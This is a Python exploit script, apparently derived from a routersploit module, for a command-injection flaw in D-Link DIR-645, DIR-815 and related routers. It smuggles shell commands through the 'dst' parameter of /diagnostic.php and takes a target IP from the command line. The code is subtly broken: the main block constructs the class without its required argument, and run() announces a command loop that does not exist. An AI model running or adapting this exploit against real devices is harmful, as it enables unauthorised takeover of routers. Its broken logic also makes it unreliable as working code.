target = ""
import requests

class Exploit:
    __info__ = {
        "name": "D-Link DIR-645 & DIR-815 RCE",
        "description": "Module exploits D-Link DIR-645 and DIR-815 Remote Code Execution vulnerability which allows executing commands on the device.",
        "authors": (
            "Michael Messner <devnull[at]s3cur1ty.de>",  # Vulnerability discovery
            "Marcin Bury <marcin[at]threat9.com>",  # routersploit module
        ),
        "references": (
            "http://www.s3cur1ty.de/m1adv2013-017",
        ),
        "devices": (
            "DIR-815 v1.03b02",
            "DIR-645 v1.02",
            "DIR-645 v1.03",
            "DIR-600 below v2.16b01",
            "DIR-300 revB v2.13b01",
            "DIR-300 revB v2.14b01",
            "DIR-412 Ver 1.14WWB02",
            "DIR-456U Ver 1.00ONG",
            "DIR-110 Ver 1.01",
        )
    }

    def __init__(self, target):
        self.target = target
        self.port = 80

    def run(self):
        if self.check():
            print("Target is vulnerable")
            print("Invoking command loop...")
        else:
            print("Exploit failed - target seems to be not vulnerable")

    def execute(self, cmd):
        data = {"act": "ping", "dst": f"& {cmd} &"}
        response = requests.post(f"{self.target}/diagnostic.php", data=data)
        return response.text

    def check(self):
        data = {"act": "ping", "dst": "& ls&"}
        response = requests.post(f"{self.target}/diagnostic.php", data=data)
        if response.status_code == 200 and "<report>OK</report>" in response.text:
            return True
        return False




import sys

if __name__ == "__main__":
    print("Run script:", __file__)
    if len(sys.argv) < 2:
        print(f"Usage: python3 {sys.argv[0]} <target_ip>")
        sys.exit(1)

    target_ip = sys.argv[1]
    exploit = Exploit()
    exploit.target = target_ip
    exploit.run()
